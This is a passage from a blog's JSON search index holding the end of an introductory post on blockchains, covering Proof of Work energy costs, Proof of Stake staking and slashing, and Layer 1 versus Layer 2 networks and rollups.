secure it becomes.\nI encourage you to look into running a node yourself to increase the security of the network!\nProof of Work does come with drawbacks. For example, Proof of Work consumes a LOT of electricity. When you have thousands of nodes all working as hard as they can to solve a block problem the energy consumption is HUGE and as such, so is the potential environmental impact.\nWith the above in mind, many protocols are choosing the shift to a different consensus mechanism that is more environmentally friendly. The most popular of which is\u0026hellip;\nProof of Stake # In contrast to trying to solve a block problem, Proof of Stake nodes put up some collateral that they are going to behave honestly aka they\nstake . If a node is found to be misbehaving, it\u0026rsquo;s stake is slashed. This serves as a very effective sybil resistance mechanism because for each account, the validator needs to put up more stake and misbehaving risks losing all that collateral.\nIn a Proof of Stake system,\nminers validators Unlike in Proof of Work, where each node is racing to solve the block problem first, in Proof of Stake, validators are pseudo-randomly chosen to propose the next block and other nodes will validate it.\nProof of Stake of course comes with its own Pros and Cons.\nPros:\ngreat sybil resistance mechanism great for the environment, much less energy Cons:\nseen as less decentralized due to upfront staking costs This raises the question of\nhow decentralized is decentralized enough?\nand I think I need to leave that to the community to decide.\nLayer 1 and Layer 2 # I want to briefly touch on the concepts of Layer 1 and Layer 2 networks here as well.\nLayer 1 solutions: This refers to base layer blockchain implementations like Bitcoin or Ethereum. Layer 2 solutions: These are applications added on top of a layer one, like Chainlink or Arbitrum. Layer 2s like Arbitrum and Optimism are special in that they\u0026rsquo;re trying to solve the problem of scalability. These protocols leverage something called\nrollups . We won\u0026rsquo;t go too deep, but the idea is that the protocols bundle their transactions to be processed by a Layer 1.\nWrap Up # This overview was huge. Amazing work, you now have a fundamental understanding of how blockchains work, how to interact with them and why they\u0026rsquo;re so secure and empowering.\n","date":"29 April 2024","externalUrl":null,"permalink":"/posts/block-chain/","section":"Posts","summary":"Web 3.0","title":"Block Chain","type":"posts"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/categories/programming/","section":"Categories","summary":"","title":"Programming","type":"categories"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/web3.0-intro/","section":"Tags","summary":"","title":"Web3.0 Intro","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]
